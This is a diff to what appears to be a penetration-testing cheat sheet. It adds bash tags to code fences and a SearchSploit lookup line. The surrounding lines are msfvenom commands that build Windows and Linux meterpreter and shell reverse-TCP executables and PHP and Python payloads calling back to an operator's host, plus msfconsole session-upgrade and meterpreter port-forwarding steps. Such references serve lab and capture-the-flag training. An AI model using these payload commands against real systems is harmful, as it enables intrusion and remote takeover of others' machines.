@@ -1,6 +1,6 @@
 ## MSFVenom
 ### Binaries
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f exe -o 6shell.exe
 
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=5555 -f elf > shell.elf
@@ -19,7 +19,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reve
 ```
 
 ### Web
-```
+```bash
 # PHP
 msfvenom -p php/reverse_php 
 
@@ -48,7 +48,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
 ```
 ## MSFConsole
-```
+```bash
 set PAYLOAD java/meterpreter/reverse_tcp
 
 sudo msfconsole
@@ -62,8 +62,12 @@ exploit
 sessions -u 1
 ```
 
+## SearchSploit
+```bash
+searchsploit [software/version]
+```
 ### Port Forwarding
-``` Port Forwarding
+```bash 
 portfwd add -R -L 0.0.0.0 -l 80 -p 8080 -r 0.0.0.0
 
 portfwd del -l 80 -p 8080 -r 127.0.0.1 -R
